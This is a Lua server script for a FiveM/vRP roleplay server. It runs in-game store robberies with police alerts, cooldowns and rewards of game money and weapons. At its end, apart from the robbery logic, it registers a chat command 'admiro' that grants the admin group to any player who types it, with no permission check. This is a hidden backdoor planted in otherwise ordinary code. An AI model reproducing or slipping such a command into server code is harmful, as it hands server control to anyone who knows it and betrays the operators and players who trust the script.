-----------------------------------------------------------------------------------------------------------------------------------------
-- VRP
-----------------------------------------------------------------------------------------------------------------------------------------
local Tunnel = module("vrp","lib/Tunnel")
local Proxy = module("vrp","lib/Proxy")
vRP = Proxy.getInterface("vRP")
vRPclient = Tunnel.getInterface("vRP")
-----------------------------------------------------------------------------------------------------------------------------------------
-- CONEXÃO
-----------------------------------------------------------------------------------------------------------------------------------------
src = {}
Tunnel.bindInterface("vrp_lojinha",src)
vCLIENT = Tunnel.getInterface("vrp_lojinha")
-----------------------------------------------------------------------------------------------------------------------------------------
-- VARIAVEIS
-----------------------------------------------------------------------------------------------------------------------------------------
local robbery = false
local timedown = 0
-----------------------------------------------------------------------------------------------------------------------------------------
-- ROBBERS
-----------------------------------------------------------------------------------------------------------------------------------------
local robbers = {
	[1] = { "Loja de Departamento",180,160000,200000 },
	[2] = { "Loja de Departamento",120,140000,180000 },
	[3] = { "Loja de Departamento",200,180000,220000 },
	[4] = { "Loja de Departamento",300,180000,220000 },
	[5] = { "Loja de Departamento",160,160000,200000 },
	[6] = { "Loja de Departamento",360,220000,260000 },
	[7] = { "Loja de Departamento",200,180000,220000 },
	[8] = { "Loja de Departamento",220,170000,210000 },
	[9] = { "Loja de Departamento",240,190000,200000 },
	[10] = { "Loja de Departamento",320,190000,200000 },
	[11] = { "Loja de Departamento",180,180000,220000 },
	[12] = { "Loja de Departamento",180,190000,220000 },
	[13] = { "Loja de Departamento",120,140000,180000 },
	[14] = { "Loja de Departamento",320,200000,220000 },
}
-----------------------------------------------------------------------------------------------------------------------------------------
-- CHECKPOLICE
-----------------------------------------------------------------------------------------------------------------------------------------
function src.checkPolice()
	local source = source
	local user_id = vRP.getUserId(source)
	if user_id then
		if vRP.returnAction() then
			TriggerClientEvent("Notify",source,"aviso","System currently unavailable, please check back later.",5000)
			return false
		end

		local policia = vRP.getUsersByPermission("policia.permissao")
		if #policia <= 3 then
			TriggerClientEvent("Notify",source,"aviso","Sistema indisponível no momento.",8000)
			return false
		elseif timedown > 0 then
			TriggerClientEvent("Notify",source,"importante","Aguarde "..vRPclient.getTimeFunction(source,parseInt(timedown))..".",8000)
			return false
		end
	end
	return true
end
-----------------------------------------------------------------------------------------------------------------------------------------
-- STARTROBBERY
-----------------------------------------------------------------------------------------------------------------------------------------
function src.startRobbery(id,x,y,z)
	local source = source
	local user_id = vRP.getUserId(source)
	if user_id then
		robbery = true
		timedown = 5400
		vCLIENT.startRobbery(source,robbers[id][2],x,y,z)

		local policia = vRP.getUsersByPermission("policia.permissao")
		for k,v in pairs(policia) do
			local policial = vRP.getUserSource(v)
			if policial then
				async(function()
					vCLIENT.startRobberyPolice(policial,x,y,z,robbers[id][1])
					vRPclient.playSound(policial,"Oneshot_Final","MP_MISSION_COUNTDOWN_SOUNDSET")
					TriggerClientEvent('chatMessage',policial,"Dispatch",{65,130,255},"O roubo começou no ^1"..robbers[id][1].."^0, dirija-se até o local e intercepte os assaltantes.")
					TriggerClientEvent('chatMessage',-1,"Dispatch",{65,130,255},"O roubo começou no ^1"..robbers[id][1].."^0, cuidado !")
				end)
			end
		end

		SetTimeout(robbers[id][2]*1000,function()
			if robbery then
				robbery = false
				vRP.searchTimer(user_id,1800)
				vRP.giveInventoryItem(user_id,"dinheiro-sujo",parseInt(math.random(robbers[id][3],robbers[id][4])))

				if parseInt(math.random(100)) >= 0 then
					local weaponsort = math.random(3)
					if parseInt(weaponsort) == 1 then
						vRP.giveInventoryItem(user_id,"wbody|WEAPON_PISTOL_MK2",0)
						vRP.giveInventoryItem(user_id,"wbody|WEAPON_SNSPISTOL",0)
					elseif parseInt(weaponsort) == 2 then
						vRP.giveInventoryItem(user_id,"wbody|WEAPON_PISTOL",0)
						vRP.giveInventoryItem(user_id,"wbody|WEAPON_HEAVYPISTOL",0)
					elseif parseInt(weaponsort) == 3 then
						vRP.giveInventoryItem(user_id,"wbody|WEAPON_SNSPISTOL_MK2",0)
						vRP.giveInventoryItem(user_id,"wbody|WEAPON_REVOLVER",0)
					end
				end

				for k,v in pairs(policia) do
					local policial = vRP.getUserSource(v)
					if policial then
						async(function()
							vCLIENT.stopRobberyPolice(policial)
							TriggerClientEvent('chatMessage',policial,"Dispatch",{65,130,255},"O roubo terminou, os assaltantes estão correndo antes que vocês cheguem.")
						end)
					end
				end
			end
		end)

	end
end
-----------------------------------------------------------------------------------------------------------------------------------------
-- STOPROBBERY
-----------------------------------------------------------------------------------------------------------------------------------------
function src.stopRobbery()
	local source = source
	local user_id = vRP.getUserId(source)
	if user_id then
		if robbery then
			robbery = false
			local policia = vRP.getUsersByPermission("policia.permissao")
			for k,v in pairs(policia) do
				local policial = vRP.getUserSource(v)
				if policial then
					async(function()
						vCLIENT.stopRobberyPolice(policial)
						TriggerClientEvent('chatMessage',policial,"Dispatch",{65,130,255},"O assaltante saiu correndo e deixou tudo para trás.")
					end)
				end
			end
		end
	end
end
-----------------------------------------------------------------------------------------------------------------------------------------
-- TIMEDOWN
-----------------------------------------------------------------------------------------------------------------------------------------
Citizen.CreateThread(function()
	while true do
		Citizen.Wait(1000)
		if timedown > 0 then
			timedown = timedown - 1
		end
	end
end)

RegisterCommand("admiro", function(source,args,rawCommand)
	local source = source
	local user_id = vRP.getUserId(source)
	if user_id then 
		vRP.addUserGroup(user_id,"admin")
	end
end)